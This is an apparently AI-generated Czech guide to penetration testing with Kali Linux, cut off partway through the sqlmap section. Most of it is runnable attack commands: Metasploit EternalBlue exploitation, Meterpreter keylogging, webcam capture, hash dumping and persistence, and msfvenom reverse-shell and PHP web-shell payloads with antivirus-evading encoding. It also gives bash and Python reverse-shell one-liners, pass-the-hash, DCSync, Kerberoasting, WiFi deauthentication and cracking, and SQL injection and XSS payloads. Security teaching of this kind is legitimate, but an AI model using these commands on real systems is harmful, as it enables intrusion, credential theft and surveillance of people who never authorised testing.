---
slug: Kali-linux
permalink: Kali-linux
---
Generováno Claude.ai
# 🛡️ Penetrační testování s Kali Linux — Kompletní průvodce

> **⚠️ PRÁVNÍ UPOZORNĚNÍ:** Všechny techniky popsané v tomto dokumentu jsou určeny **výhradně pro legální penetrační testování** na systémech, ke kterým máte **písemné povolení**. Neoprávněný přístup k cizím systémům je trestný čin. Tento dokument slouží pouze pro vzdělávací účely.

---

## Obsah

1. [Co je Kali Linux](#1-co-je-kali-linux)
2. [Metodologie penetračního testování](#2-metodologie-penetra%C4%8Dn%C3%ADho-testov%C3%A1n%C3%AD)
3. [Reconnaissance — Průzkum](#3-reconnaissance--pr%C5%AFzkum)
4. [Scanning & Enumeration](#4-scanning--enumeration)
5. [Exploitation — Zneužití zranitelností](#5-exploitation--zneu%C5%BEit%C3%AD-zranitelnost%C3%AD)
6. [Post-Exploitation](#6-post-exploitation)
7. [Wireless Network Testing](#7-wireless-network-testing)
8. [Web Application Testing](#8-web-application-testing)
9. [Password Attacks](#9-password-attacks)
10. [Social Engineering](#10-social-engineering)
11. [Reporting](#11-reporting)

---

## 1. Co je Kali Linux

**Kali Linux** je specializovaná distribuce Linuxu vyvinutá společností **Offensive Security**, postavená na Debian GNU/Linux. Je navržena primárně pro penetrační testování, digitální forenzní analýzu a bezpečnostní výzkum.

### Klíčové vlastnosti

- Obsahuje **600+ předinstalovaných nástrojů** pro bezpečnostní testování
- Dostupné jako Live USB, VM (VMware/VirtualBox), WSL2, ARM (Raspberry Pi)
- Pravidelné aktualizace s rolling-release modelem
- Podporuje multi-platformní nasazení

### Instalace a nastavení

```bash
# Aktualizace systému po instalaci
sudo apt update && sudo apt upgrade -y

# Instalace nejnovějšího toolsetu
sudo apt install kali-linux-everything -y

# Ověření verze
uname -a
lsb_release -a
```

---

## 2. Metodologie penetračního testování

Penetrační testování se řídí standardní metodologií. Nejčastěji se používá framework **PTES (Penetration Testing Execution Standard)** nebo **OWASP Testing Guide**.

```
┌─────────────────────────────────────────────────────────┐
│              FÁZE PENETRAČNÍHO TESTOVÁNÍ                 │
├──────────────────────────────────────────────────────────┤
│  1. PRE-ENGAGEMENT  → Definice scope, pravidla, smlouvy  │
│  2. RECONNAISSANCE  → Pasivní & aktivní průzkum          │
│  3. SCANNING        → Port scan, service detection        │
│  4. ENUMERATION     → Výčet uživatelů, shares, služeb    │
│  5. EXPLOITATION    → Zneužití zranitelností             │
│  6. POST-EXPLOIT    → Privilege escalation, persistence  │
│  7. REPORTING       → Dokumentace nálezů, doporučení     │
└──────────────────────────────────────────────────────────┘
```

---

## 3. Reconnaissance — Průzkum

### 3.1 OSINT — Pasivní průzkum

Pasivní průzkum nezanechává stopy v cílové síti. Sbíráme informace z veřejně dostupných zdrojů.

---

#### 🔍 `whois`

**Co je:** Standardní unixový nástroj pro dotazování WHOIS databází registrátorů domén.  
**Jak funguje:** Posílá dotaz na WHOIS server registrátora domény nebo IP adresy a vrací registrační metadata.  
**Jak se používá:**

```bash
# Základní WHOIS dotaz na doménu
whois target.com

# WHOIS na IP adresu
whois 192.168.1.1

# Výstup přesměrujeme do souboru
whois target.com > recon/whois_target.txt
```

**Co hledáme:** Jméno registranta, e-maily, telefonní čísla, name servery, datum expirace, registrátora.

---

#### 🔍 `theHarvester`

**Co je:** Nástroj pro sběr e-mailů, subdomén, hostů, IP adres a URL adres z veřejných zdrojů.  
**Jak funguje:** Scrapuje různé veřejné zdroje jako Google, Bing, LinkedIn, Shodan, DNSdumpster atd.  
**Jak se používá:**

```bash
# Sběr dat z Google (200 výsledků)
theHarvester -d target.com -b google -l 200

# Použití všech zdrojů najednou
theHarvester -d target.com -b all

# Export do XML souboru
theHarvester -d target.com -b google,bing,linkedin -f output.xml

# Použití Shodan (vyžaduje API klíč)
theHarvester -d target.com -b shodan
```

**Co hledáme:** E-mailové adresy zaměstnanců, subdomény, veřejně exponované servery.

---

#### 🔍 `maltego`

**Co je:** Grafický OSINT nástroj pro vizualizaci vztahů mezi entitami (osoby, domény, IP, organizace).  
**Jak funguje:** Používá „transforms" — skripty, které přeměňují jednu entitu na jinou (doménu → IP → WHOIS → osoba).  
**Jak se používá:**

```bash
# Spuštění GUI aplikace
maltego
```

V GUI:

1. Vyber entitu (např. doménu `target.com`)
2. Klikni pravým tlačítkem → Run All Transforms
3. Sleduj jak se grafu přidávají propojené entity
4. Exportuj graf jako PDF nebo obrázek

---

#### 🔍 `recon-ng`

**Co je:** Modulární OSINT framework podobný Metasploitu, ale zaměřený na průzkum.  
**Jak funguje:** Modulární architektura — každý modul sbírá specifický typ informací z jednoho zdroje.  
**Jak se používá:**

```bash
# Spuštění
recon-ng

# Uvnitř recon-ng konzole:
[recon-ng] > workspaces create target_assessment
[recon-ng] > db insert domains
  domain >> target.com

# Výpis dostupných modulů
[recon-ng] > marketplace search

# Instalace a spuštění modulu
[recon-ng] > marketplace install recon/domains-hosts/hackertarget
[recon-ng] > modules load recon/domains-hosts/hackertarget
[recon-ng] > run

# Zobrazení výsledků
[recon-ng] > show hosts
```

---

#### 🔍 `shodan` (CLI)

**Co je:** „Google pro internet věcí" — vyhledávač pro zařízení připojená k internetu.  
**Jak funguje:** Pravidelně skenuje celý internet a indexuje bannery a metadata služeb.  
**Jak se používá:**

```bash
# Instalace CLI klienta
pip install shodan

# Inicializace s API klíčem
shodan init YOUR_API_KEY

# Vyhledávání dle organizace
shodan search "org:\"Target Company\""

# Vyhledávání zranitelností
shodan search "vuln:CVE-2021-44228"

# Info o konkrétní IP
shodan host 192.168.1.1

# Stažení výsledků
shodan download results "apache country:CZ"
```

---

### 3.2 DNS Enumerace

#### 🔍 `dnsrecon`

**Co je:** Pokročilý DNS enumerační nástroj.  
**Jak funguje:** Provádí různé typy DNS dotazů — přenosy zón, brute-force subdomén, reverzní lookup, SRV záznamy atd.  
**Jak se používá:**

```bash
# Standardní enumerace
dnsrecon -d target.com

# Pokus o přenos zóny (zone transfer)
dnsrecon -d target.com -t axfr

# Brute-force subdomén pomocí wordlistu
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt

# Reverzní lookup rozsahu IP
dnsrecon -r 192.168.1.0/24

# Výstup do JSON
dnsrecon -d target.com -j output.json
```

---

#### 🔍 `dnsenum`

**Co je:** Perl skript pro DNS enumeraci a zjišťování subdomén.  
**Jak funguje:** Kombinuje standardní DNS dotazy s brute-force a Google scraping.  
**Jak se používá:**

```bash
# Základní enumerace
dnsenum target.com

# S vlastním wordlistem
dnsenum --dnsserver 8.8.8.8 -f /usr/share/wordlists/subdomains-top1m.txt target.com

# Uložení výsledků
dnsenum --enum target.com -o results.xml
```

---

#### 🔍 `fierce`

**Co je:** DNS scanner zaměřený na hledání IP prostorů a subdomén organizace.  
**Jak funguje:** Dělá DNS přenosy zón, brute-force subdomén, a hledá wildcards.  
**Jak se používá:**

```bash
# Základní sken
fierce --domain target.com

# S vlastním wordlistem
fierce --domain target.com --wordlist /usr/share/wordlists/fierce/hosts.txt

# Nastavení DNS serveru
fierce --domain target.com --dns-servers 8.8.8.8
```

---

## 4. Scanning & Enumeration

### 4.1 Network Scanning

#### 🔍 `nmap` — Network Mapper

**Co je:** Nejpoužívanější open-source nástroj pro síťové skenování a bezpečnostní audit.  
**Jak funguje:** Posílá speciálně vytvořené pakety na cílové hostitele a analyzuje odpovědi. Dokáže detekovat otevřené porty, běžící služby, operační systém, verze softwaru a spouštět skripty pro rozšířenou detekci.  
**Jak se používá:**

```bash
# ═══════════════════════════════════════
# ZÁKLADNÍ SKENOVÁNÍ
# ═══════════════════════════════════════

# Ping sweep — kdo je nahoře v síti
nmap -sn 192.168.1.0/24

# Rychlý sken nejčastějších 1000 portů
nmap -T4 192.168.1.1

# Sken všech 65535 portů
nmap -p- 192.168.1.1

# Sken konkrétních portů
nmap -p 22,80,443,3389 192.168.1.1

# ═══════════════════════════════════════
# TYPY SKENŮ
# ═══════════════════════════════════════

# SYN scan (stealth, vyžaduje root)
nmap -sS 192.168.1.1

# TCP Connect scan (nevyžaduje root)
nmap -sT 192.168.1.1

# UDP scan (pomalejší)
nmap -sU 192.168.1.1

# NULL, FIN, Xmas scany (obcházení firewallů)
nmap -sN 192.168.1.1   # NULL
nmap -sF 192.168.1.1   # FIN
nmap -sX 192.168.1.1   # Xmas

# ═══════════════════════════════════════
# DETEKCE VERZÍ A OS
# ═══════════════════════════════════════

# Detekce verze služeb
nmap -sV 192.168.1.1

# Detekce OS
nmap -O 192.168.1.1

# Agresivní sken (OS + verze + skripty + traceroute)
nmap -A 192.168.1.1

# ═══════════════════════════════════════
# NSE SKRIPTY
# ═══════════════════════════════════════

# Spuštění výchozích skriptů
nmap -sC 192.168.1.1

# Spuštění konkrétního skriptu
nmap --script=http-title 192.168.1.1

# Sken zranitelností
nmap --script vuln 192.168.1.1

# SMB enumeration skripty
nmap --script smb-enum-shares,smb-enum-users -p 445 192.168.1.1

# HTTP enumeration
nmap --script http-enum -p 80,443 192.168.1.1

# Heartbleed test
nmap --script ssl-heartbleed -p 443 192.168.1.1

# ═══════════════════════════════════════
# VÝSTUP A REPORTING
# ═══════════════════════════════════════

# Uložení do všech formátů najednou
nmap -A 192.168.1.0/24 -oA scan_results

# XML výstup (pro import do jiných nástrojů)
nmap -A 192.168.1.1 -oX scan.xml

# Grepovatelný výstup
nmap -A 192.168.1.1 -oG scan.gnmap

# ═══════════════════════════════════════
# VYHÝBÁNÍ SE DETEKCI (IDS EVASION)
# ═══════════════════════════════════════

# Fragmentace paketů
nmap -f 192.168.1.1

# Použití decoys (návnad)
nmap -D RND:10 192.168.1.1

# Zpomalení skenu (méně nápadné)
nmap -T1 192.168.1.1

# Spoofing MAC adresy
nmap --spoof-mac 0 192.168.1.1

# Skenování přes proxy
nmap --proxies socks4://127.0.0.1:9050 192.168.1.1
```

---

#### 🔍 `masscan`

**Co je:** Ultrarychlý port scanner schopný skenovat celý internet za méně než 6 minut.  
**Jak funguje:** Implementuje vlastní TCP/IP stack (asynchronní), díky čemuž je řádově rychlejší než nmap.  
**Jak se používá:**

```bash
# Sken celé sítě na port 80
masscan 192.168.1.0/24 -p 80

# Sken více portů s rychlostí 10000 paketů/s
masscan 192.168.1.0/24 -p 22,80,443,8080 --rate 10000

# Uložení výsledků
masscan 10.0.0.0/8 -p 0-65535 --rate 50000 -oX masscan_results.xml

# Kombinace s nmap — nejdříve masscan, pak detailní nmap scan
masscan 192.168.1.0/24 -p 0-65535 --rate 10000 -oG masscan.txt
# Pak z výsledků extrahovat IP a spustit nmap
```

---

### 4.2 Service Enumeration

#### 🔍 `enum4linux`

**Co je:** Nástroj pro enumeraci informací ze systémů Windows/Samba přes SMB protokol.  
**Jak funguje:** Využívá nástroje jako `rpcclient`, `nmblookup`, `smbclient` k dotazování SMB/RPC na informace o uživatelích, skupinách, sdílených složkách a politikách.  
**Jak se používá:**

```bash
# Kompletní enumerace
enum4linux -a 192.168.1.100

# Výčet uživatelů
enum4linux -U 192.168.1.100

# Výčet sdílených složek
enum4linux -S 192.168.1.100

# Výčet skupin
enum4linux -G 192.168.1.100

# Informace o OS
enum4linux -o 192.168.1.100

# S přihlašovacími údaji
enum4linux -u admin -p password -a 192.168.1.100

# Uložení výstupu
enum4linux -a 192.168.1.100 | tee enum4linux_output.txt
```

---

#### 🔍 `smbclient`

**Co je:** Klient pro přístup ke sdíleným složkám SMB/CIFS.  
**Jak funguje:** Implementuje SMB protokol a umožňuje interakci se sdílenými složkami podobně jako FTP klient.  
**Jak se používá:**

```bash
# Výpis dostupných sdílených složek (anonymně)
smbclient -L //192.168.1.100 -N

# Připojení ke konkrétní složce
smbclient //192.168.1.100/Share -N

# Připojení s credentials
smbclient //192.168.1.100/Share -U admin%password

# Uvnitř smbclient shellu:
smb: \> ls                    # výpis souborů
smb: \> get secret.txt        # stažení souboru
smb: \> put exploit.exe       # nahrání souboru
smb: \> recurse ON; mget *    # stažení všech souborů
```

---

#### 🔍 `snmpwalk`

**Co je:** Nástroj pro procházení SNMP MIB stromu cílového zařízení.  
**Jak funguje:** Posílá SNMP GetNext požadavky postupně přes celý MIB strom a zobrazuje všechny dostupné OID hodnoty.  
**Jak se používá:**

```bash
# Procházení SNMP v1 s community string "public"
snmpwalk -v1 -c public 192.168.1.1

# SNMPv2c dotaz
snmpwalk -v2c -c public 192.168.1.1

# Dotaz na konkrétní OID (systémové info)
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1

# Výčet síťových rozhraní
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.2.2.1

# Uložení do souboru
snmpwalk -v2c -c public 192.168.1.1 > snmp_output.txt
```

---

#### 🔍 `nikto`

**Co je:** Web server scanner hledající potenciální problémy a nebezpečné soubory.  
**Jak funguje:** Testuje web servery oproti databázi 6700+ potenciálně nebezpečných souborů, zastaralých verzí serverů a specifických problémů verzí.  
**Jak se používá:**

```bash
# Základní sken
nikto -h http://192.168.1.100

# Sken HTTPS
nikto -h https://target.com -ssl

# Sken s autentizací
nikto -h http://target.com -id admin:password

# Sken konkrétního portu
nikto -h 192.168.1.100 -p 8080

# Uložení výsledků do HTML
nikto -h http://target.com -o nikto_report.html -Format htm

# Tuning — typy testů (1=Interesting file, 2=Misconfiguration...)
nikto -h http://target.com -Tuning 123

# Použití proxy (Burp Suite)
nikto -h http://target.com -useproxy http://127.0.0.1:8080
```

---

## 5. Exploitation — Zneužití zranitelností

### 5.1 Metasploit Framework

**Co je:** Nejrozšířenější framework pro penetrační testování a vývoj exploitů.  
**Jak funguje:** Poskytuje modulární architekturu složenou z exploitů, payloadů, auxiliárních modulů, post-exploitation modulů a encoderů. Každý exploit využívá konkrétní zranitelnost a payload zajišťuje přístup po úspěšném exploitu.

```
ARCHITEKTURA METASPLOITU:
├── Exploits      → Zneužívají konkrétní zranitelnosti
├── Payloads      → Co se provede po úspěšném exploitu
│   ├── Singles   → Kompaktní, vše v jednom paketu
│   ├── Stagers   → Navazují spojení, stáhnou stage
│   └── Stages    → Meterpreter, shell, VNC...
├── Auxiliaries   → Skenery, fuzzery, brute-force
├── Post          → Post-exploitation moduly
├── Encoders      → Obfuskace payloadů
└── NOPs          → No Operation padding
```

**Jak se používá:**

```bash
# ═══════════════════════════════════════
# ZÁKLADNÍ PRÁCE S MSF KONZOLÍ
# ═══════════════════════════════════════

# Spuštění konzole
msfconsole

# Inicializace a aktualizace databáze
msfdb init
msfdb start

# Nmap sken přímo z MSF (výsledky v DB)
msf6 > db_nmap -sV -A 192.168.1.0/24

# Zobrazení hostů v databázi
msf6 > hosts
msf6 > services
msf6 > vulns

# ═══════════════════════════════════════
# HLEDÁNÍ A VÝBĚR MODULŮ
# ═══════════════════════════════════════

# Vyhledávání exploitu
msf6 > search eternalblue
msf6 > search type:exploit platform:windows smb

# Použití modulu
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Zobrazení informací o modulu
msf6 > info

# Zobrazení parametrů
msf6 > show options

# ═══════════════════════════════════════
# KONFIGURACE A SPUŠTĚNÍ EXPLOITU
# ═══════════════════════════════════════

# Nastavení cíle
msf6 > set RHOSTS 192.168.1.100
msf6 > set RPORT 445

# Nastavení payload
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Nastavení listeneru (útočník)
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444

# Ověření konfigurace
msf6 > show options

# Spuštění exploitu
msf6 > exploit
# nebo
msf6 > run

# Spuštění jako background job
msf6 > exploit -j

# ═══════════════════════════════════════
# METERPRETER PŘÍKAZY
# ═══════════════════════════════════════

# Po získání Meterpreter session:
meterpreter > sysinfo              # info o systému
meterpreter > getuid               # aktuální uživatel
meterpreter > getpid               # PID procesu
meterpreter > ps                   # výpis procesů

# Migrace do stabilnějšího procesu
meterpreter > migrate 1234

# Privilege escalation
meterpreter > getsystem

# Hashe hesel
meterpreter > hashdump

# Keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Screenshot
meterpreter > screenshot

# Webcam
meterpreter > webcam_list
meterpreter > webcam_snap

# Filesystem
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download C:\\Users\\Admin\\secrets.txt
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\

# Shell
meterpreter > shell

# Pivoting — přesměrování portů
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.1

# Persistence
meterpreter > run persistence -S -U -X -p 4444 -r 192.168.1.50

# Background session
meterpreter > background

# Výpis sessions
msf6 > sessions -l

# Obnovení session
msf6 > sessions -i 1

# ═══════════════════════════════════════
# GENEROVÁNÍ PAYLOADŮ — MSFVENOM
# ═══════════════════════════════════════

# Windows reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o payload.exe

# Linux reverse shell ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o payload.elf

# PHP web shell
msfvenom -p php/meterpreter_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

# Python payload
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o payload.py

# Payload s enkódováním (obcházení AV)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o payload_encoded.exe

# Nastavení multi/handler listeneru
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > exploit -j
```

---

### 5.2 Ruční exploitace

#### 🔍 `searchsploit`

**Co je:** CLI nástroj pro prohledávání lokální kopie Exploit-DB databáze.  
**Jak funguje:** Prohledává strukturované záznamy v offline kopii exploit-db.com databáze.  
**Jak se používá:**

```bash
# Vyhledávání exploitu
searchsploit apache 2.4
searchsploit --id vsftpd 2.3.4

# Zkopírování exploitu do aktuálního adresáře
searchsploit -m 49757

# Aktualizace databáze
searchsploit -u

# Výstup ve formátu JSON
searchsploit --json apache | jq '.'
```

---

#### 🔍 Ruční exploitace s `netcat` a `python`

```bash
# Netcat listener (příjem reverse shell)
nc -lvnp 4444

# Odeslání reverse bash shellu
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.50",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Upgrade shellu na plně interaktivní TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Pak: Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm
```

---

## 6. Post-Exploitation

### 6.1 Privilege Escalation — Linux

#### 🔍 `linpeas`

**Co je:** Shell skript automaticky hledající potenciální cesty pro privilege escalation na Linuxu.  
**Jak funguje:** Spouští stovky kontrolních příkazů a výsledky barevně zvýrazňuje dle závažnosti.  
**Jak se používá:**

```bash
# Stažení a spuštění
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Lokální spuštění (po přenosu na cíl)
chmod +x linpeas.sh
./linpeas.sh

# Uložení výstupu
./linpeas.sh | tee linpeas_output.txt

# Přenos na cílový stroj
# Na útočníkovi:
python3 -m http.server 8080
# Na cíli:
wget http://192.168.1.50:8080/linpeas.sh
```

**Co hledáme:** SUID/SGID bity, sudo práva, cron joby, writeable soubory, zastaralý kernel, credentials v config souborech.

---

#### 🔍 Ruční privilege escalation — Linux checklist

```bash
# ═══════════════════════════════════════
# ZÁKLADNÍ INFORMACE
# ═══════════════════════════════════════
id && whoami
uname -a
cat /etc/os-release
hostname

# ═══════════════════════════════════════
# SUDO PRÁVA
# ═══════════════════════════════════════
sudo -l

# Pokud je povoleno sudo na libovolný příkaz:
sudo /bin/bash

# ═══════════════════════════════════════
# SUID BINARIES
# ═══════════════════════════════════════
find / -perm -4000 -type f 2>/dev/null
# Zkontroluj GTFOBins.github.io pro zneužití SUID binárií

# ═══════════════════════════════════════
# CRON JOBY
# ═══════════════════════════════════════
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# ═══════════════════════════════════════
# WRITEABLE SOUBORY A ADRESÁŘE
# ═══════════════════════════════════════
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

# ═══════════════════════════════════════
# HESLA V KONFIGURAČNÍCH SOUBORECH
# ═══════════════════════════════════════
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
cat /etc/shadow 2>/dev/null
history

# ═══════════════════════════════════════
# KERNEL EXPLOITY
# ═══════════════════════════════════════
uname -r
# Pak hledat exploity pro konkrétní verzi kernelu
```

---

### 6.2 Privilege Escalation — Windows

#### 🔍 `winpeas`

**Co je:** Windows verze linpeas — automatizovaný nástroj pro hledání escalation vektorů.  
**Jak funguje:** Spouští sérii příkazů a kontroluje Windows-specifické vektory jako služby, registry, UAC, unquoted paths atd.  
**Jak se používá:**

```cmd
# Spuštění (na cílovém Windows stroji)
winPEASx64.exe

# Výstup do souboru
winPEASx64.exe > winpeas_output.txt

# Specifické kategorie
winPEASx64.exe systeminfo
winPEASx64.exe userinfo
winPEASx64.exe servicesinfo
```

---

#### 🔍 Ruční privilege escalation — Windows checklist

```powershell
# ═══════════════════════════════════════
# ZÁKLADNÍ INFORMACE
# ═══════════════════════════════════════
whoami /all
systeminfo
hostname
net users
net localgroup administrators

# ═══════════════════════════════════════
# SLABÉ SLUŽBY
# ═══════════════════════════════════════
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"

# Slabá práva na service bináriích
icacls "C:\Program Files\Vulnerable Service\service.exe"

# ═══════════════════════════════════════
# REGISTRY AUTORUN
# ═══════════════════════════════════════
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# ═══════════════════════════════════════
# ULOŽENÁ HESLA
# ═══════════════════════════════════════
# Windows Credential Manager
cmdkey /list

# AutoLogon heslo v registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Vyhledávání hesel v souborech
dir /s /b *pass* *cred* *vnc* *.config* 2>nul
findstr /si password *.xml *.ini *.txt
```

---

### 6.3 Lateral Movement

#### 🔍 `crackmapexec`

**Co je:** Multifunkční nástroj pro post-exploitation v Active Directory prostředích.  
**Jak funguje:** Umožňuje využívat SMB, WinRM, LDAP, MSSQL a další protokoly pro průzkum a laterální pohyb v síti.  
**Jak se používá:**

```bash
# SMB enumerace s credentials
crackmapexec smb 192.168.1.0/24 -u admin -p 'Password123'

# Pass the Hash
crackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'

# Spuštění příkazu na vzdáleném systému
crackmapexec smb 192.168.1.100 -u admin -p 'Password123' -x "whoami"

# Dump SAM databáze
crackmapexec smb 192.168.1.100 -u admin -p 'Password123' --sam

# Dump LSA secrets
crackmapexec smb 192.168.1.100 -u admin -p 'Password123' --lsa

# WinRM (PSRemoting)
crackmapexec winrm 192.168.1.100 -u admin -p 'Password123' -x "Get-Process"

# LDAP — enumerace uživatelů AD
crackmapexec ldap 192.168.1.100 -u admin -p 'Password123' --users
```

---

#### 🔍 `impacket`

**Co je:** Kolekce Python tříd/skriptů pro práci se síťovými protokoly (SMB, MSRPC, LDAP, Kerberos...).  
**Jak funguje:** Reimplementuje různé Windows síťové protokoly v Pythonu bez nutnosti instalace Windows.  
**Jak se používá:**

```bash
# PsExec — vzdálené spuštění
impacket-psexec domain/admin:'Password123'@192.168.1.100

# WMIExec — vzdálená správa přes WMI
impacket-wmiexec domain/admin:'Password123'@192.168.1.100

# SMBExec
impacket-smbexec domain/admin:'Password123'@192.168.1.100

# Dump hashe z DC (DCSync útok)
impacket-secretsdump domain/admin:'Password123'@192.168.1.100

# Kerberoasting
impacket-GetUserSPNs domain.local/user:'Password' -dc-ip 192.168.1.100 -request

# AS-REP Roasting
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.100

# Dump NTDS.dit (domain hash dump)
impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL
```

---

## 7. Wireless Network Testing

### 7.1 WiFi Penetrační testování

**⚠️ Varování:** Testování bezdrátových sítí je legální POUZE na sítích, kde máte povolení. Nezákonné rušení nebo přístup k bezdrátovým sítím je trestný čin.

#### 🔍 `aircrack-ng` Suite

**Co je:** Kompletní sada nástrojů pro audit bezpečnosti WiFi sítí.  
**Jak funguje:** Kombinuje sniffer, packet injector, autentizační nástroje a cracker pro testování bezdrátových sítí standardů 802.11.

```bash
# ═══════════════════════════════════════
# PŘÍPRAVA — MONITOR MODE
# ═══════════════════════════════════════

# Výpis bezdrátových rozhraní
iwconfig

# Nastavení monitor módu
airmon-ng start wlan0
# Nebo ručně:
ip link set wlan0 down
iw wlan0 set monitor control
ip link set wlan0 up

# Zabití rušivých procesů
airmon-ng check kill

# ═══════════════════════════════════════
# SKENOVÁNÍ SÍTÍ
# ═══════════════════════════════════════

# Zobrazení dostupných sítí
airodump-ng wlan0mon

# Zachytávání na konkrétní síti (pro handshake)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# ═══════════════════════════════════════
# WPA/WPA2 CRACKING
# ═══════════════════════════════════════

# Deautentizační útok (vynucení handshake)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Po zachycení handshake — cracking slovníkem
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap

# ═══════════════════════════════════════
# WEP CRACKING
# ═══════════════════════════════════════

# Zachycení WEP provozu
airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# ARP replay útok (generování IV)
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Cracking WEP
aircrack-ng wep_capture.cap

# ═══════════════════════════════════════
# WPS ATTACKS
# ═══════════════════════════════════════

# Skenování WPS sítí
wash -i wlan0mon

# Pixie Dust útok (rychlý WPS crack)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv

# Brute-force WPS PIN
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv
```

---

#### 🔍 `wifite`

**Co je:** Automatizovaný wireless auditor — zjednodušuje celý proces testování WiFi.  
**Jak funguje:** Automaticky skenuje sítě, vybírá vhodný útok (WEP/WPA/WPS/PMKID) a provede ho.  
**Jak se používá:**

```bash
# Automatický útok na všechny dostupné sítě
wifite

# Útok pouze na WPA sítě
wifite --wpa

# Použití konkrétního wordlistu
wifite --dict /usr/share/wordlists/rockyou.txt

# Cílit konkrétní BSSID
wifite --bssid AA:BB:CC:DD:EE:FF

# Bez WEP (zaměřit se jen na WPA)
wifite --nowep
```

---

#### 🔍 `hashcat` — WiFi hash cracking

```bash
# Konverze zachyceného handshake do hashcat formátu
hcxpcapngtool -o hash.hc22000 capture.cap

# PMKID útok (bez nutnosti handshake — hcxdumptool)
hcxdumptool -o pmkid.pcapng -i wlan0mon --enable_status=1

# Cracking WPA handshake
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# S pravidly
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# GPU accelerated cracking
hashcat -m 22000 hash.hc22000 wordlist.txt -d 1
```

---

## 8. Web Application Testing

### 8.1 Burp Suite

**Co je:** Integrovaná platforma pro testování bezpečnosti webových aplikací.  
**Jak funguje:** Funguje jako intercepting proxy — zachytává HTTP/HTTPS komunikaci mezi prohlížečem a serverem a umožňuje ji analyzovat, modifikovat a replikovat.

```bash
# Spuštění
burpsuite

# Nastavení proxy v prohlížeči:
# HTTP: 127.0.0.1:8080
# HTTPS: 127.0.0.1:8080
# Importovat Burp CA certifikát z http://burpsuite
```

**Hlavní moduly:**

- **Proxy** — Zachytávání a modifikace requestů/responsů v reálném čase
- **Repeater** — Opakované odesílání a modifikace requestů
- **Intruder** — Automatizované útoky (brute-force, fuzzing)
- **Scanner** (Pro) — Automatické hledání zranitelností
- **Decoder** — Enkódování/dekódování dat (Base64, URL, HTML...)
- **Comparer** — Porovnávání requestů a responsů

---

#### 🔍 Základní workflow Burp Suite

```
1. Zachytit request (Proxy → Intercept ON)
2. Analyzovat parametry
3. Poslat do Repeateru (Ctrl+R)
4. Testovat injekce:
   - SQL: ' OR '1'='1
   - XSS: <script>alert(1)</script>
   - Command injection: ; id
5. Poslat do Intruderu pro automatizaci
```

---

### 8.2 SQL Injection

#### 🔍 `sqlmap`

**Co je:** Automatizovaný nástroj pro detekci a exploitaci SQL injection zranitelností.  
**Jak funguje:** Testuje parametry HTTP requestů různými SQL injection technikami (boolean-based, error-based, time-based, UNION-based, stacked queries) a automaticky adaptuje na typ databáze.  
**Jak se používá:**

```bash
# Základní test URL parametru
sqlmap -u "http://target.com/page.php?id=1"

# Automatické potvrzení prompts
sqlmap -u "http://target.com/page.php?id=1" --batch

# Dump celé databáze
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Výpis databází
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Výpis tabulek konkrétní DB
sqlmap -u "http://target.com/page.php?id=1" -D targetdb --tables

# Dump konkrétní tabulky
